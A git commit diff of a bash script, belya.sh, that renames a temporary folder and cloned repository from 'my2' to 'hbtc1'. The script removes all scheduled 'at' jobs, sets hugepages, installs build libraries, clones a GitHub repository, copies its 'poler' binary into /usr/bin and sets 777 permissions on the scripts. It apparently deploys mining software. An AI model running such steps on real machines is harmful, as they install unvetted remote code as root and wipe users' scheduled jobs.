0bb1434d29f7ac4fcd31072d4e4c21821deb5e72
burkabest <52100051+burkabest@users.noreply.github.com>
2019-08-19 16:08:15 -0400

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/my2/
+rm -rf /tmp/hbtc1/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir my2
-git clone https://github.com/burkabest/my2.git /tmp/my2
-cd /tmp/my2
-chmod +x /tmp/my2/poler
+cd /tmp && mkdir hbtc1
+git clone https://github.com/burkabest/hbtc1.git /tmp/hbtc1
+cd /tmp/hbtc1
+chmod +x /tmp/hbtc1/poler
 chmod 777 ./*.sh
-cp /tmp/my2/poler /usr/bin/
+cp /tmp/hbtc1/poler /usr/bin/
 
 sudo apt-get install dos2unix
 sudo dos2unix time1.sh
